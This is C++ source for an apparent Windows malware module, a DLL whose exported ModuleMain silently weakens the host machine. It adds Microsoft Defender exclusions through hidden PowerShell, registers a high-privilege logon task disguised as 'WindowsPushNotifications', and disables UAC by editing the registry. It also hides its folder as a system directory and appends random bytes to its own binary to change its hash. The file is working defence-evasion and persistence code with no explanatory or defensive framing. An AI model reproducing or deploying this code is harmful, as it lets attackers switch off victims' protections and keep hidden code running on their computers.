#include <Windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <random>
#include <sstream>
#include <chrono>
#include <iomanip>

class mrph {
private:

    static void Log(const std::string& msg) {

    }

    static void LogW(const std::wstring& msg) {

    }

public:
    static std::string ToUtf8(const std::wstring& wideStr) {
        if (wideStr.empty()) return "";
        int size = WideCharToMultiByte(CP_UTF8, 0, &wideStr[0], (int)wideStr.size(), NULL, 0, NULL, NULL);
        std::string str(size, 0);
        WideCharToMultiByte(CP_UTF8, 0, &wideStr[0], (int)wideStr.size(), &str[0], size, NULL, NULL);
        return str;
    }

    static std::wstring ToWide(const std::string& str) {
        if (str.empty()) return L"";
        int size = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
        std::wstring wstr(size, 0);
        MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], size);
        return wstr;
    }

    static std::string ExecAndGetOutput(const std::wstring& cmd) {
        std::string result;
        HANDLE hRead, hWrite;
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "";

        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;

        PROCESS_INFORMATION pi;
        if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hWrite);
            char buffer[128];
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead != 0) {
                buffer[bytesRead] = '\0';
                result += buffer;
            }
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            CloseHandle(hWrite);
        }
        CloseHandle(hRead);
        return result;
    }

    static bool IsExcluded(const std::wstring& path) {
        std::wstring cmd = L"powershell -Command \"if ((Get-MpPreference).ExclusionPath -contains '" + path + L"') { Write-Output 'TRUE' } else { Write-Output 'FALSE' }\"";
        std::string output = ExecAndGetOutput(cmd);
        return (output.find("TRUE") != std::string::npos);
    }

    static bool excl(const std::wstring& path) {
        if (IsExcluded(path)) return true;

        std::wstring cmd = L"powershell -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '" + path + L"' -ErrorAction SilentlyContinue\"";
        WinExec(ToUtf8(cmd).c_str(), SW_HIDE);

        Sleep(3000);
        return IsExcluded(path);
    }

    static bool TaskExists(const std::wstring& taskName) {
        std::wstring cmd = L"schtasks /Query /TN \"" + taskName + L"\"";
        std::string output = ExecAndGetOutput(cmd);
        return (output.find("ERROR:") == std::string::npos && !output.empty());
    }

    static bool est(const std::wstring& loaderPath) {
        std::wstring taskName = L"WindowsPushNotifications";
        if (TaskExists(taskName)) return true;

        wchar_t drive[_MAX_DRIVE], dir[_MAX_DIR];
        _wsplitpath_s(loaderPath.c_str(), drive, _MAX_DRIVE, dir, _MAX_DIR, NULL, 0, NULL, 0);
        std::wstring workingDir = std::wstring(drive) + dir;

        if (!workingDir.empty() && workingDir.back() == L'\\') {
            workingDir.pop_back();
        }

        auto now = std::chrono::system_clock::now();
        std::time_t t = std::chrono::system_clock::to_time_t(now);
        std::tm bt;
        localtime_s(&bt, &t);
        std::stringstream ss;
        ss << std::put_time(&bt, "%Y-%m-%dT%H:%M:%S");

        std::stringstream xml;
        xml << "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
            << "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
            << "  <Triggers>\n"
            << "    <LogonTrigger>\n"
            << "      <StartBoundary>" << ss.str() << "</StartBoundary>\n"
            << "      <Enabled>true</Enabled>\n"
            << "    </LogonTrigger>\n"
            << "  </Triggers>\n"
            << "  <Principals>\n"
            << "    <Principal id=\"Author\">\n"
            << "      <LogonType>InteractiveToken</LogonType>\n"
            << "      <RunLevel>HighestAvailable</RunLevel>\n"
            << "    </Principal>\n"
            << "  </Principals>\n"
            << "  <Settings>\n"
            << "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
            << "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
            << "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
            << "    <AllowHardTerminate>true</AllowHardTerminate>\n"
            << "    <StartWhenAvailable>true</StartWhenAvailable>\n"
            << "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
            << "    <IdleSettings>\n"
            << "      <StopOnIdleEnd>false</StopOnIdleEnd>\n"
            << "      <RestartOnIdle>false</RestartOnIdle>\n"
            << "    </IdleSettings>\n"
            << "    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
            << "    <Enabled>true</Enabled>\n"
            << "    <Hidden>false</Hidden>\n"
            << "    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
            << "    <WakeToRun>false</WakeToRun>\n"
            << "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n"
            << "    <Priority>7</Priority>\n"
            << "  </Settings>\n"
            << "  <Actions Context=\"Author\">\n"
            << "    <Exec>\n"
            << "      <Command>\"" << ToUtf8(loaderPath) << "\"</Command>\n"
            << "      <WorkingDirectory>" << ToUtf8(workingDir) << "</WorkingDirectory>\n"
            << "    </Exec>\n"
            << "  </Actions>\n"
            << "</Task>";

        wchar_t tP[MAX_PATH], tF[MAX_PATH];
        if (!GetTempPathW(MAX_PATH, tP) || !GetTempFileNameW(tP, L"UPD", 0, tF)) return false;

        std::string tempPathUtf8 = ToUtf8(tF);
        std::ofstream o(tempPathUtf8.c_str());
        if (!o.is_open()) return false;

        o << xml.str();
        o.close();

        std::string cmd = "schtasks /Create /TN \"" + ToUtf8(taskName) + "\" /XML \"" + tempPathUtf8 + "\" /F";
        WinExec(cmd.c_str(), SW_HIDE);
        Sleep(2000);

        DeleteFileW(tF);
        return TaskExists(taskName);
    }

    static bool IsUACDisabled() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_READ, &hKey) != ERROR_SUCCESS) return false;

        DWORD val = 1;
        DWORD sz = sizeof(val);
        RegQueryValueExW(hKey, L"EnableLUA", NULL, NULL, (LPBYTE)&val, &sz);
        RegCloseKey(hKey);
        return (val == 0);
    }

    static bool lua() {
        if (IsUACDisabled()) return true;

        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) return false;

        DWORD disable = 0;
        LONG result = RegSetValueExW(hKey, L"EnableLUA", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegCloseKey(hKey);

        return (result == ERROR_SUCCESS && IsUACDisabled());
    }

    static bool hsh(const std::wstring& filePath) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> lenDis(512, 2048);

        std::string pathUtf8 = ToUtf8(filePath);
        std::fstream file(pathUtf8.c_str(), std::ios::binary | std::ios::in | std::ios::out | std::ios::ate);
        if (!file.is_open()) return false;

        int junkSize = lenDis(gen);
        std::vector<char> junk(junkSize);
        for (int i = 0; i < junkSize; ++i) {
            junk[i] = (char)(rd() % 256);
        }

        file.write(junk.data(), junk.size());
        file.close();
        return true;
    }

    static bool shd(const std::wstring& path) {
        DWORD attrs = GetFileAttributesW(path.c_str());
        if (attrs == INVALID_FILE_ATTRIBUTES) return false;
        if ((attrs & FILE_ATTRIBUTE_HIDDEN) && (attrs & FILE_ATTRIBUTE_SYSTEM)) return true;

        return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
    }

    static void exec(const std::wstring& targetPath) {
        wchar_t drv[_MAX_DRIVE], dr[_MAX_DIR];
        _wsplitpath_s(targetPath.c_str(), drv, _MAX_DRIVE, dr, _MAX_DIR, NULL, 0, NULL, 0);
        std::wstring parent = std::wstring(drv) + dr;

        excl(targetPath);

        bool parentExcluded = IsExcluded(parent);
        bool taskExists = TaskExists(L"Microsoft_Windows_Push_Notifications");
        bool uacDisabled = IsUACDisabled();
        bool dirHidden = false;

        DWORD attrs = GetFileAttributesW(parent.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES) {
            dirHidden = ((attrs & FILE_ATTRIBUTE_HIDDEN) && (attrs & FILE_ATTRIBUTE_SYSTEM));
        }

        if (parentExcluded && taskExists && uacDisabled && dirHidden) {
            hsh(targetPath);
            return;
        }

        if (!parentExcluded) excl(parent);
        if (!taskExists) est(targetPath);
        if (!uacDisabled) lua();
        if (!dirHidden) shd(parent);

        hsh(targetPath);
    }
};

extern "C" __declspec(dllexport) void ModuleMain() {
    wchar_t pP[MAX_PATH];
    if (GetModuleFileNameW(NULL, pP, MAX_PATH)) {
        mrph::exec(pP);
    }
}